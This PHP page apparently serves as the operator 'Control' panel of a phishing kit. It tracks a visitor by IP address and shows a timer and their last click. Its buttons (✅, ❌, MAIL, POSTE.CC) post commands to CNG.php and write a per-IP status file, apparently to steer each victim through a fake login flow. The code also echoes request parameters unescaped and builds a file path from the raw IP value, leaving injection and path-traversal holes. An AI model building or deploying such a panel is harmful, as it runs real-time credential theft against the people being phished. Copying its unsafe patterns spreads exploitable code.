<?php
$time = isset($_GET['time']) ? $_GET['time'] : "";
if (isset($_GET['buttonClicked'])) {
    $buttonClicked = $_GET['buttonClicked'];
}
?>
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <link rel="icon" href="./assets/img/success.png" type="image/png">
        <title>Control</title>
    </head>
<body class="smaller-content" style="background-color: black; color: green; justify-content: center; display: block; align-items: center; height: 100vh; margin: 0;">
<style>
.button-row {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        align-items: center;
    }

    .top-buttons {
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 20px;
    }

    @media (min-width: 768px) {
        .button-row {
            flex-direction: row;
        }

        .top-buttons {
            margin-bottom: 10px;
        }
    }

    .smaller-content {
        font-size: 13px;
        font-weight: bold;
    }
    </style>
<!--------->
	<div class="top-buttons">
                <button style="margin: 15px; border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="0refresh-button no-outline" name="to" onclick="handleButtonClick0()">🔙 RETURN</button>
                    <button style="margin: 15px; border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="refresh-button no-outline" name="refresh" type="submit">↻ REFRESH</button></div>
    <script>
        function handleButtonClick0() {
            window.location.href = "../index.php";
        }
    
        document.querySelector('.refresh-button').addEventListener('click', function(event) {
            event.preventDefault();
            location.reload();
        });
    </script>
<!--------->
 <div style='display:<?php if (isset($_GET['time'])) {
    if (empty($_GET['time'])) {
        // Code to execute if $_GET['time'] is empty
        echo "none";
    } else {
        // Code to execute if $_GET['time'] is not empty
        echo "block";
    }
} else {
    echo "none";
} ?>'></div>
<!---->
<div class="top-buttons"><a style="margin: 10px; border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" >【 ⏱ 】:【 <span style="color: red;" id="counter">0 seconds</span> 】</a> 

  <script>
    // Function to update the counter
    function updateCounter(capturedTime) {
      var currentTime = new Date();
      var timeDifference = currentTime - capturedTime;
      var secondsPassed = Math.floor(timeDifference / 1000)-3600;

 if (secondsPassed < 0 || secondsPassed < -86400) {
        secondsPassed += 86400;
    }
else if (secondsPassed < 0 ){
secondsPassed += 3600;
}
      
      var counterElement = document.getElementById("counter");
      counterElement.textContent = secondsPassed + "";

      setTimeout(function() {
        updateCounter(capturedTime);
      }, 1000); // Update every 1 second
    }

    // Replace this with your captured time in the format "HH:MM:SS"
    var capturedTime = "<?php if (isset($time)) {
    echo $time;
} ?>"; 

    var parts = capturedTime.split(":");
    var capturedDate = new Date();
    capturedDate.setHours(parts[0]);
    capturedDate.setMinutes(parts[1]);
    capturedDate.setSeconds(parts[2]);

    updateCounter(capturedDate);
  </script>

<div style='display:<?php if (isset($_GET['time'])) {
    if (empty($_GET['time'])) {
        // Code to execute if $_GET['time'] is empty
        echo "none";
    } else {
        // Code to execute if $_GET['time'] is not empty
        echo "block";
    }
} else {
    echo "none";
} ?>'></div>

         <style="color: green; text-align: center;margin:50px;display:<?php if (isset($_GET['buttonClicked'])) {
    $buttonClicked = $_GET['buttonClicked'];
    echo "block";
} else {
    echo "none";
}
?>;"> <?php
if (isset($_GET['buttonClicked'])) {
    $buttonClicked = $_GET['buttonClicked'];
    echo "<div style='margin: 10px; border: 2px solid green; background-color: transparent; padding: 10px 20px; cursor: pointer;'>【 🖱 】:【</span> <span style='color: red;'> $buttonClicked</span> 】</div>";
}
?></div>

<!---->
<div class="" style='display:<?php if (isset($_GET['buttonClicked'])) {
    $buttonClicked = $_GET['buttonClicked'];
    echo "block";
} else {
    echo "none";
}
?>'></div>
<!--------->
            <form method="post" action="CNG.php" style="margin-top:5px;">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
				<div class="button-row">
                <button style="margin:17px;border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="btn btn-danger" type="submit" class="btn btn-success" name="to" value="V">✅</button>
				<button style="margin:17px;border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="btn btn-danger" type="submit" class="btn btn-success" name="to" value="X">❌</button>
                <button style="margin:17px;border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="btn btn-danger" type="submit" class="btn btn-success" name="to" value="M">MAIL</button>
                <button style="margin:17px;border: 2px solid green; color: green; background-color: transparent; padding: 10px 20px; cursor: pointer;" class="btn btn-danger" type="submit" class="btn btn-success" name="to" value="P">POSTE.CC</button>
<input type="hidden" name="time" value='<?php echo $time ?>'>
            </form>
<!--------->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script>
            $('button[type="button"]').click(function(){
                var href = $(this).attr('href');
                $(href).slideToggle(100);
            });
        </script>
<!--------->
    </body>

</html>
<!--------->
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    // Now you can use $ip in your code
    
}
$startTime = microtime(true); // Get the current timestamp with microseconds
$delayInSeconds = 1;
while (true) {
    $currentTime = microtime(true);
    if ($currentTime - $startTime >= $delayInSeconds) {
        // Your code to be executed after the delay
        $fp = fopen('./IPS/' . $ip . '.txt', 'wb');
        fwrite($fp, "0");
        fclose($fp);
        break;
    }
}
?>
